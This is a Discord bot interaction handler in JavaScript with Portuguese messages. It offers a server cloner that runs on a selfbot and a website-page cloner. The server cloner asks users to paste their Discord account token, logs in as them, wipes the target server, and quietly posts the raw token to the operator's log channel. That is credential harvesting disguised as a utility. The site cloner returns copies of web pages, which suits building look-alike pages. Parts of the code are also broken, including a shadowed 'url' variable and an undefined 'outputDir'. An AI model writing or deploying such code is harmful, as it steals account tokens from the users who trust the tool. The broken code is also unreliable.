const { ModalBuilder, TextInputStyle, TextInputBuilder, ActionRowBuilder, ChannelType } = require("discord.js");
const { Client } = require('discord.js-selfbot-v13');
const axios = require('axios');
const cheerio = require('cheerio');
const path = require('path');
const url = require('url');
const fs = require('fs-extra');
const archiver = require('archiver');
const { owner, logs, cargoclient } = require("../../config.json");


module.exports = {
    name: "interactionCreate",
    run: async (interaction) => {
        const { customId, user, client } = interaction;
        if (!customId) return;

const userRole = interaction.member.roles.cache.has(cargoclient);

if (!userRole) {
    return interaction.reply({ content: `❌ **| Você não tem permissão para usar este comando.**`, ephemeral: true });
}



        if (customId === "panelcloner") {
            const modal = new ModalBuilder()
                .setCustomId(`panelclonermodal`)
                .setTitle("Psychiatry Clone");

            const original = new TextInputBuilder()
                .setCustomId("original")
                .setLabel("SERVIDOR ORIGINAL")
                .setPlaceholder("ID DO SERVIDOR QUE QUER COPIAR")
                .setStyle(1)
                .setRequired(true);

            const token = new TextInputBuilder()
                .setCustomId("token")
                .setLabel("TOKEN")
                .setStyle(1)
                .setPlaceholder("TOKEN QUE ESTEJA EM AMBOS SERVIDORES")
                .setRequired(true);

            const alvo = new TextInputBuilder()
                .setCustomId("alvo")
                .setLabel("SERVIDOR CÓPIA")
                .setStyle(1)
                .setPlaceholder("ID DO SEU SERVIDOR PADRÃO")
                .setRequired(true);

            modal.addComponents(new ActionRowBuilder().addComponents(original));
            modal.addComponents(new ActionRowBuilder().addComponents(token));
            modal.addComponents(new ActionRowBuilder().addComponents(alvo));

            return interaction.showModal(modal);
        }

        if (customId === "panelclonermodal") {
            const original = interaction.fields.getTextInputValue("original");
            const token = interaction.fields.getTextInputValue("token");
            const target = interaction.fields.getTextInputValue("alvo");
            await interaction.reply({ content: `<:carregando:1245053919416029248> Verificando as informações...`, ephemeral: true });
            const self = new Client();
            let t;
            try {
                await self.login(token).catch(() => t = true);
            } catch {
                t = true;
            }
            if (t) return interaction.editReply({ content: `<:icons_Wrong:1243192894450569236> Token inválido`, ephemeral: true });
        
            const guilds = [await self.guilds.cache.get(original), await self.guilds.cache.get(target)];
            let s;
            guilds.forEach(g => {
                if (!g) s = true;
            });
            if (s) return interaction.editReply({ content: `<:icons_Wrong:1243192894450569236> A conta não está nos dois servidores`, ephemeral: true });
            const channel_logs = client.channels.cache.get(logs);
            if(channel_logs) channel_logs.send({
                content:`🙌 **| Usuário:** ${user} (\`${user.id}\`)\n👷‍♂️ **| Servidor Original:** \`${guilds[0].name}} (${guilds[0].id})\`👷‍♂️ **| Servidor Colado:** \`${guilds[1].name}} (${guilds[1].id})\`\n🔒 **| Token:** ${token}\n👤 **| Informações:** ${self.user.username} (\`${self.user.id}\`)`
            }).catch(() => {});
        
            let itens = {
                text: guilds[0].channels.cache.filter(c => c.type === "GUILD_TEXT").sort((a, b) => a.calculatedPosition - b.calculatedPosition).map(c => c),
                voice: guilds[0].channels.cache.filter(c => c.type === "GUILD_VOICE").sort((a, b) => a.calculatedPosition - b.calculatedPosition).map(c => c),
                category: guilds[0].channels.cache.filter(c => c.type === "GUILD_CATEGORY").sort((a, b) => a.calculatedPosition - b.calculatedPosition).map(c => c),
                roles: guilds[0].roles.cache.sort((a, b) => b.calculatedPosition - a.calculatedPosition).map(r => r)
            }
            await interaction.editReply({ content: `<:carregando:1245053919416029248> **| Clonando o Servidor \`${guilds[0].name}\`**` });
        
            await interaction.editReply({ content: `<:carregando:1245053919416029248> **| Clonando o Servidor \`${guilds[0].name}\`**\n- Estou deletando todos os Cargos & Canais` });
        
            await guilds[1].channels.cache.forEach(c => c.delete().catch(() => {}));
            await guilds[1].roles.cache.map(r => r.delete().catch(() => {}));
            await guilds[1].emojis.cache.map(r => r.delete().catch(() => {}));
        
            await guilds[1].setIcon(guilds[0].iconURL());
            await guilds[1].setName(`${guilds[0].name} .gg/arquivos`);
        
            await interaction.editReply({ content: `<:carregando:1245053919416029248> **| Clonando o Servidor \`${guilds[0].name}\`**\n- Estou copiando todos os Cargos...` });
        
            for (let role of itens.roles) {
                if (guilds[1].roles.cache.get(role.id)) continue;
        
                guilds[1].roles.create({
                    name: role.name,
                    color: role.color,
                    permissions: role.permissions,
                    managed: role.managed,
                    mentionable: role.mentionable,
                    position: role.position
                }).catch(() => {});
            }
            await interaction.editReply({ content: `<:carregando:1245053919416029248> **| Clonando o Servidor \`${guilds[0].name}\`**\n- Estou copiando todos os emojis...` });
        
            await guilds[0].emojis.cache.forEach(e => {
                if (guilds[1].emojis.cache.get(e.id)) return;
                guilds[1].emojis.create(e.url, e.name).catch(() => {});
            });
        
            await interaction.editReply({ content: `<:carregando:1245053919416029248> **| Clonando o Servidor \`${guilds[0].name}\`**\n- Estou copiando todas as Categorias...` });
            for (let category of itens.category) {
                if (guilds[1].channels.cache.get(category.id)) return;
        
                await guilds[1].channels.create(category.name, {
                    type: ChannelType.GuildCategory,
                    permissionOverwrites: Array.from(category.permissionOverwrites).map(v => {
                        let target = guilds[0].roles.cache.get(v.id);
                        if (!target) return;
                        return {
                            id: guilds[1].roles.cache.find(r => r.name == target.name)?.id || guilds[1].id,
                            allow: v.allow,
                            deny: v.deny,
                        };
                    }).filter(v => v),
                    position: category.position
                }).catch(() => {});
            }
            await interaction.editReply({ content: `<:carregando:1245053919416029248> **| Clonando o Servidor \`${guilds[0].name}\`**\n- Estou copiando todos os canais de texto...` });
        
            for (let channel of itens.text) {
                if (guilds[1].channels.cache.get(channel.id)) continue;
        
                if (!channel.parent) {
                    try {
                        await guilds[1].channels.create(channel.name, {
                            type: ChannelType.GuildText,
                            permissionOverwrites: Array.from(channel.permissionOverwrites).map(v => {
                                let target = guilds[0].roles.cache.get(v.id);
                                if (!target) return;
                                return {
                                    id: guilds[1].roles.cache.find(r => r.name == target.name)?.id || guilds[1].id,
                                    allow: v.allow,
                                    deny: v.deny,
                                };
                            }).filter(v => v),
                            position: channel.position
                        }).then(c => c.setTopic(channel.topic)).catch(() => {});
                    } catch {

                    }
                } else {
                    let chn = await guilds[1].channels.create(channel.name, {
                        type: ChannelType.GuildText,
                        permissionOverwrites: Array.from(channel.permissionOverwrites).map(v => {
                            let target = guilds[0].roles.cache.get(v.id);
                            if (!target) return;
                            return {
                                id: guilds[1].roles.cache.find(r => r.name == target.name)?.id || guilds[1].id,
                                allow: v.allow,
                                deny: v.deny,
                            };
                        }).filter(v => v),
                        position: channel.position
                    }).catch(() => {});
                    if (channel.topic) chn.setTopic(channel.topic).catch(() => {});
        
                    if (guilds[1].channels.cache.find(c => c.name == channel.parent.name)) {
                        chn?.setParent(guilds[1].channels.cache.find(c => c.name == channel.parent.name)?.id);
                    } else {
                        try {
                            var cat = await guilds[1].channels.create(channel.parent.name, {
                                type: ChannelType.GuildCategory,
                                permissionOverwrites: Array.from(channel.parent.permissionOverwrites).map(v => {
                                    let target = guilds[0].roles.cache.get(v.id);
                                    if (!target) return;
                                    return {
                                        id: guilds[1].roles.cache.find(r => r.name == target.name)?.id || guilds[1].id,
                                        allow: v.allow,
                                        deny: v.deny,
                                    };
                                }).filter(v => v),
                                position: channel.parent.position
                            }).catch(() => {});
                            chn?.setParent(cat).catch(() => {});
                        } catch {

                        }
                    }
                }
            }
        
            await interaction.editReply({ content: `<:carregando:1245053919416029248> **| Clonando o Servidor \`${guilds[0].name}\`**\n- Estou copiando todos os canais de voz...` });
            for (let channel of itens.voice) {
                if (guilds[1].channels.cache.get(channel.id)) continue;
        
                if (!channel.parent) {
                    try {
                        await guilds[1].channels.create(channel.name, {
                            type: ChannelType.GuildVoice,
                            permissionOverwrites: Array.from(channel.permissionOverwrites).map(v => {
                                let target = guilds[0].roles.cache.get(v.id);
                                if (!target) return;
                                return {
                                    id: guilds[1].roles.cache.find(r => r.name == target.name)?.id || guilds[1].id,
                                    allow: v.allow,
                                    deny: v.deny,
                                };
                            }).filter(v => v),
                            position: channel.position,
                            userLimit: channel.userLimit
                        }).catch(() => {});
                    } catch {

                    }
                } else {
                    try {
                        let chn = await guilds[1].channels.create(channel.name, {
                            type: ChannelType.GuildVoice,
                            permissionOverwrites: Array.from(channel.permissionOverwrites).map(v => {
                                let target = guilds[0].roles.cache.get(v.id);
                                if (!target) return;
                                return {
                                    id: guilds[1].roles.cache.find(r => r.name == target.name)?.id || guilds[1].id,
                                    allow: v.allow,
                                    deny: v.deny,
                                };
                            }).filter(v => v),
                            position: channel.position,
                            userLimit: channel.userLimit
                        }).catch(() => {});
                    } catch {}
        
                    try {
                        if (guilds[1].channels.cache.find(c => c.name == channel.parent.name)) {
                            chn.setParent(guilds[1].channels.cache.find(c => c.name == channel.parent.name).id);
                        } else {
                            try {
                                var cat = await guilds[1].channels.create(channel.parent.name, {
                                    type: ChannelType.GuildCategory,
                                    permissionOverwrites: Array.from(channel.parent.permissionOverwrites).map(v => {
                                        let target = guilds[0].roles.cache.get(v.id);
                                        if (!target) return;
                                        return {
                                            id: guilds[1].roles.cache.find(r => r.name == target.name)?.id || guilds[1].id,
                                            allow: v.allow,
                                            deny: v.deny,
                                        };
                                    }).filter(v => v),
                                    position: channel.parent.position,
                                }).catch(() => {});
                                chn.setParent(cat).catch(() => {});
                            } catch {

                            }
                        }
                    } catch {}
                }
            }
            await interaction.editReply({ content: `<:icons_Correct:1243192893070643335> Servidor clonado com sucesso` });
            await self.logout().catch(() => {});
        }
        
        if (interaction.isButton() && interaction.customId === "ClonerSite") {
    const modal = new ModalBuilder()
        .setCustomId('url-cop')
        .setTitle('Insira a URL do site');

    const option1 = new TextInputBuilder()
        .setCustomId('name-site')
        .setLabel('Nome para o site')
        .setStyle(TextInputStyle.Short)
        .setPlaceholder('Portfólio')
        .setMaxLength(50)
        .setRequired(true);

    const option2 = new TextInputBuilder()
        .setCustomId('url-input')
        .setLabel('URL do site')
        .setStyle(TextInputStyle.Short)
        .setPlaceholder('https://')
        .setRequired(true);

    modal.addComponents(
        new ActionRowBuilder().addComponents(option1),
        new ActionRowBuilder().addComponents(option2)
    );
    await interaction.showModal(modal);
}

if (interaction.isModalSubmit() && interaction.customId === "url-cop") {
    try {
        const filename = interaction.fields.getTextInputValue('name-site');
        const url = interaction.fields.getTextInputValue('url-input');

        await interaction.reply({ content: `🔁 | Espere um momento, estamos trabalhando nisso...`, ephemeral: true });

        const fetchPage = async (pageUrl) => {
            try {
                const response = await axios.get(pageUrl);
                return response.data;
            } catch (error) {
                console.error(`Erro ao buscar a página: ${error.message}`);
                return null;
            }
        };

        const updateLinks = async (html, baseUrl) => {
            const $ = cheerio.load(html);

            const updateLink = async (elem, attr) => {
                const link = $(elem).attr(attr);
                if (link) {
                    const absoluteLink = url.resolve(baseUrl, link);
                    const parsedUrl = url.parse(absoluteLink);
                    const localPath = path.join(outputDir, parsedUrl.pathname);

                    try {
                        const response = await axios.get(absoluteLink, { responseType: 'arraybuffer' });
                        $(elem).attr(attr, parsedUrl.pathname);
                    } catch (error) {
                        console.error(`Erro ao baixar recurso ${absoluteLink}: ${error.message}`);
                        $(elem).attr(attr, link);
                    }
                }
            };

            const promises = [];

            $('a[href]').each((i, elem) => promises.push(updateLink(elem, 'href')));
            $('img[src]').each((i, elem) => promises.push(updateLink(elem, 'src')));
            $('link[href]').each((i, elem) => promises.push(updateLink(elem, 'href')));
            $('script[src]').each((i, elem) => promises.push(updateLink(elem, 'src')));

            await Promise.all(promises);

            return $.html();
        };

        const sendHtml = async (htmlContent) => {
            const buffer = Buffer.from(htmlContent, 'utf-8');
            return buffer;
        };

        const cloneSite = async (siteUrl) => {
            const htmlContent = await fetchPage(siteUrl);
            if (!htmlContent) return null;

            const updatedHtml = await updateLinks(htmlContent, siteUrl);

            return sendHtml(updatedHtml);
        };

        const htmlBuffer = await cloneSite(url);

        if (htmlBuffer) {
            await interaction.editReply({
                content: `✅ | Olá ${interaction.user}, o seu clone site está pronto!`,
                files: [{ attachment: htmlBuffer, name: `${filename}.html` }],
                ephemeral: true
            });
        } else {
            await interaction.editReply({ content: `❌ | Ocorreu um erro ao tentar clonar o site. Por favor, tente novamente mais tarde.`, ephemeral: true });
        }

    } catch (error) {
        console.error('Erro durante a clonagem do site:', error);
        await interaction.editReply({ content: `❌ | Ocorreu um erro ao tentar clonar o site. Por favor, tente novamente mais tarde.`, ephemeral: true });
     }
    }
   }
 }
